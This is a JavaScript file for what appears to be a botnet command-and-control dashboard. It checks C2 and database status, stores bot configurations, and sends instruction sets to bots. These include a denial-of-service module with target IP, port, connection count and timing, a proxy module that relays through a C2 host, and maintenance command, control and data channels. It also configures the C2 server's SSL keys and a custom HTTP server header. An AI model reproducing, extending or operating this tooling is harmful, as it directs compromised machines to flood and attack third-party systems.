  // === DB STATUS ===
  async function updateDBStatus() {
    try {
      const res = await fetch('/api/status/db');
      const data = await res.json();

      const pill = document.querySelector('.status-field:nth-child(3) .pill');
      if (data.mariadb && data.mongodb) {
        pill.className = 'pill pill-connected';
        pill.textContent = 'Connected';
      } else {
        pill.className = 'pill pill-offline';
        pill.textContent = 'Offline';
      }
    } catch (err) {
      console.error("DB status error", err);
    }
  }

  // === C2 STATUS ===
  async function updateC2Status() {
    try {
      const res = await fetch('/api/status/c2');
      const { c2 } = await res.json();
      const c2Pill = document.querySelector('.status-field:nth-child(2) .pill');
      c2Pill.className = 'pill ' + (c2 ? 'pill-connected' : 'pill-offline');
      c2Pill.textContent = c2 ? 'Connected' : 'Offline';
    } catch (e) {
      console.error('C2 status check failed:', e);
    }
  }

  function clearModalInputs(modalId) {
    const modal = document.getElementById(modalId);
    if (!modal) return;
    modal.querySelectorAll('input, textarea').forEach(el => {
      if (el.type === 'checkbox' || el.type === 'radio') {
        el.checked = false;
      } else {
        el.value = '';
      }
    });
  }
  

  window.showCustomAlert = (message) => {
    const alertBox = document.getElementById('custom-alert');
    const alertMessage = document.getElementById('custom-alert-message');
    alertMessage.textContent = message;
    alertBox.classList.remove('hidden');
  }

  window.closeCustomAlert = () => {
    document.getElementById('custom-alert').classList.add('hidden');
  }

  // === MODAL LOGIC ===
  window.openModal = () => {
    document.getElementById('settings-modal').classList.add('visible');
    document.body.classList.add('modal-open');
  };

  window.closeModal = () => {
    document.getElementById('settings-modal').classList.remove('visible');
    document.body.classList.remove('modal-open');
    clearModalInputs('settings-modal');
  };


  // === INIT ===
  window.addEventListener('DOMContentLoaded', () => {
    updateDBStatus();
    updateC2Status();
    setInterval(updateDBStatus, 10000);
    setInterval(updateC2Status, 10000);
  });

  // === DATABASE MODAL LOGIC ===
  window.openDBModal = () => {
    document.getElementById('db-modal').classList.add('visible');
    document.body.classList.add('modal-open');
  };

  window.closeDBModal = () => {
    document.getElementById('db-modal').classList.remove('visible');
    document.body.classList.remove('modal-open');
    clearModalInputs('db-modal');
  };

  window.saveDBSettings = () => {
    const maria = {
    server: document.getElementById('maria-server').value,
    port: document.getElementById('maria-port').value,
    database: document.getElementById('maria-database').value,
    user: document.getElementById('maria-user').value,
    password: document.getElementById('maria-password').value,
    disableSSL: document.getElementById('maria-disable-ssl').value
  };

  const mongo = {
    general: {
      host: document.getElementById('mongo-host').value,
      port: document.getElementById('mongo-port').value,
      uri: document.getElementById('mongo-uri').value,
      init_token: document.getElementById('mongo-init-token').value
    },
    server_configs: {
      name: document.getElementById('mongo-server-name').value,
      collection: document.getElementById('mongo-server-collection').value
    },
    bot_configs: {
      name: document.getElementById('mongo-bot-name').value,
      collection: document.getElementById('mongo-bot-collection').value
    },
    bot_instructions: {
      name: document.getElementById('mongo-instr-name').value,
      collection: document.getElementById('mongo-instr-collection').value
    }
  };


  console.log("MariaDB Settings:", maria);
  console.log("MongoDB Settings:", mongo);
  closeDBModal();
  };

  window.openInstructionsModal = () => {
    document.getElementById('instructions-modal').classList.add('visible');
    document.body.classList.add('modal-open');
  };

  window.closeInstructionsModal = () => {
    document.getElementById('instructions-modal').classList.remove('visible');
    document.body.classList.remove('modal-open');
    clearModalInputs('instructions-modal');
    closeJSONEditor();
  };

  window.saveInstructions = async () => {
    const instructions = {};
  
    if (document.getElementById('dos-target-ip').value) {
      instructions.dos = {
        execution_time: document.getElementById('dos-exec-time').value,
        module: "dos",
        until: document.getElementById('dos-until-time').value,
        parameters: {
          target_ip: document.getElementById('dos-target-ip').value,
          target_port: +document.getElementById('dos-target-port').value,
          connection_count: +document.getElementById('dos-conn-count').value,
          delay_ms: +document.getElementById('dos-delay').value
        }
      };
    }
  
    if (document.getElementById('init-sleep').value) {
      instructions.init = {
        module: "control",
        sleep: document.getElementById('init-sleep').value
      };
    }
  
    if (document.getElementById('proxy-host').value) {
      instructions.proxy = {
        until: document.getElementById('proxy-until-time').value,
        module: "proxy",
        parameters: {
          c2_host: document.getElementById('proxy-host').value,
          c2_port: +document.getElementById('proxy-port').value
        }
      };
    }
  
    if (document.getElementById('maintenance-modules').value) {
      instructions.maintenance = {
        module: "maintenance",
        modules: document.getElementById('maintenance-modules').value
                     .split(',').map(s => s.trim()),
        connection: {
          command: {
            address: document.getElementById('cmd-addr').value,
            port: +document.getElementById('cmd-port').value
          },
          control: {
            address: document.getElementById('ctrl-addr').value,
            port: +document.getElementById('ctrl-port').value
          },
          data: {
            address: document.getElementById('data-addr').value,
            port: +document.getElementById('data-port').value
          }
        },
        files: {
          certificate: document.getElementById('maintenance-cert').value
        }
      };
    }
  
    if (Object.keys(instructions).length === 0) {
      return showCustomAlert('⚠️ Please fill at least one instruction block.');
    }
  
    try {
      const res = await fetch('/api/instructions', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({instructions})
              });
      if (!res.ok) throw new Error(`Server responded ${res.status}`);
  
      showCustomAlert('✅ Instructions saved!');
    } catch (err) {
      console.error('Error saving instructions:', err);
      showCustomAlert('❌ Failed to save instructions.');
    } finally {
      clearModalInputs('instructions-modal');
      closeInstructionsModal();
    }
  };
  

  document.getElementById("json-file-input").addEventListener("change", function (event) {
    const file = event.target.files[0];
    if (file) {
        const reader = new FileReader();
        reader.onload = function (e) {
            try {
                const jsonData = JSON.parse(e.target.result);
                const formatted = JSON.stringify(jsonData, null, 2);
                document.getElementById("json-editor").value = formatted;
            } catch (err) {
                showCustomAlert("⚠️ Invalid JSON file.");
                console.error(err);
            }
        };
        reader.readAsText(file);
    }
});


  window.loadJSONEditor = () => {
    document.getElementById('instruction-form').style.display = 'none';
    document.getElementById('json-editor-section').style.display = 'block';
  };
  
  window.closeJSONEditor = () => {
    document.getElementById('instruction-form').style.display = 'block';
    document.getElementById('json-editor-section').style.display = 'none';
    clearModalInputs('json-editor-section');
  };
  
  let selectedFileName = "";

  document.getElementById('json-file-input').addEventListener('change', async e => {
    const file = e.target.files[0];
    if (!file) return;

    selectedFileName = file.name;
    const text = await file.text();
    document.getElementById('json-editor').value = text;
  });

  window.saveJSONEditor = async () => {
    if (!selectedFileName) {
      return showCustomAlert('⚠️ No file selected');
    }

    const jsonContent = document.getElementById('json-editor').value;
    try {
      const res = await fetch('/api/save-instruction-json', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          filename: selectedFileName,
          content: jsonContent
        })
      });
      const data = await res.json();
      if (data.success) {
        showCustomAlert(`✅ Saved to: ${data.path}`);
        closeJSONEditor()
      } else {
        showCustomAlert(`❌ ${data.error}`);
      }
    } catch (err) {
      console.error(err);
      showCustomAlert('❌ Save failed');
    }
  };

  window.saveSettings = () => {
    const settings = {
        mariadb_path: document.getElementById('mariadb-path').value,
        mongodb_path: document.getElementById('mongodb-path').value,
        c2_path: document.getElementById('c2-path').value,
        instructions_path: document.getElementById('instructions-path').value
    };

    fetch('/save-settings', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(settings)
    })
    .then(res => res.json())
    .then(data => {
        if (data.success) {
            showCustomAlert('✅ ' + data.message);
            closeModal();
          } else {
            showCustomAlert('❌ ' + data.message);
        }
    })
    .catch(err => {
        console.error('Save settings failed:', err);
        showCustomAlert('❌ Failed to contact server.');
    });
  };

// === C2 MODAL LOGIC ===
window.openC2Modal = () => {
  document.getElementById('c2-modal').classList.add('visible');
  document.body.classList.add('modal-open');
};

window.closeC2Modal = () => {
  document.getElementById('c2-modal').classList.remove('visible');
  document.body.classList.remove('modal-open');
  clearModalInputs('c2-modal'); 
};

document
  .getElementById('c2-btn')  
  .addEventListener('click', openC2Modal);

function wireCompactPicker(fileInputId, textFieldId) {
  const fileInput = document.getElementById(fileInputId);
  const textField = document.getElementById(textFieldId);

  fileInput.addEventListener('change', e => {
    const file = e.target.files[0];
    if (!file) return;
    textField.value = file.name;
    e.target.value = '';
  });
}

window.addEventListener('DOMContentLoaded', () => {
  wireCompactPicker('c2-dos-file',   'c2-dos');
  wireCompactPicker('c2-init-file',  'c2-init');
  wireCompactPicker('c2-proxy-file', 'c2-proxy');
  wireCompactPicker('c2-maint-file', 'c2-maint');
  wireCompactPicker('c2-suites-file', 'c2-tool-suites');
  wireCompactPicker('c2-ssl-chain-file', 'c2-ssl-chain');
  wireCompactPicker('c2-ssl-ca-file',    'c2-ssl-ca');
  wireCompactPicker('c2-ssl-key-file',   'c2-ssl-key');
  wireCompactPicker('c2-ssl-pub-file',   'c2-ssl-pub');
  wireCompactPicker('c2-ssl-dh-file',    'c2-ssl-dh');
  wireCompactPicker('c2-http-api-file',  'c2-http-api');
});



  window.saveC2Config = async () => {
    const cfg = { _id: 'control_server', instructions: {}, general: {}, networking: {} };
  
    ['dos','init','sleep','update','tool-suites'].forEach(k => {
      const val = document.getElementById(`c2-${k}`).value;
      if (val) cfg.instructions[k] = val;
    });
  
    const gAddr    = document.getElementById('c2-server-address').value;
    const gPort    = document.getElementById('c2-server-port').value;
    const gThreads = document.getElementById('c2-server-threads').value;
    if (gAddr||gPort||gThreads) {
      cfg.general.server = { };
      if (gAddr)    cfg.general.server.address = gAddr;
      if (gPort)    cfg.general.server.port    = gPort;
      if (gThreads) cfg.general.server.io_context_threads = gThreads;
    }
  
    const lAddr = document.getElementById('c2-logger-address').value;
    const lPort = document.getElementById('c2-logger-port').value;
    if (lAddr || lPort) {
      cfg.general.logger = {};
      if (lAddr) cfg.general.logger.address = lAddr;
      if (lPort) cfg.general.logger.port    = lPort;
    }
  
    const ssl = {};
    ['chain','ca','key','pub','dh'].forEach(s => {
      const v = document.getElementById(`c2-ssl-${s}`).value;
      if (v) ssl[{
        chain: 'certificate_chain',
        ca:    'ca_certificate',
        key:   'private_key',
        pub:   'public_key',
        dh:    'dh_file'
      }[s]] = v;
    });
    if (Object.keys(ssl).length) cfg.networking.ssl = ssl;
  
    const api = document.getElementById('c2-http-api').value;
    const hdr = document.getElementById('c2-http-header').value;
    cfg.networking.http = {};
    if (api) cfg.networking.http.api_endpoints = api;
    if (hdr) cfg.networking.http.server_header = hdr;
  
    try {
      const res = await fetch('/api/c2-config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(cfg)
      });
      const json = await res.json();
      if (json.success) {
        showCustomAlert('✅ C2 config saved to: ' + json.path);
        closeC2Modal();
      } else {
        showCustomAlert('❌ ' + json.error);
      }
    } catch (err) {
      console.error(err);
      showCustomAlert('❌ C2 save failed');
    }
  };
  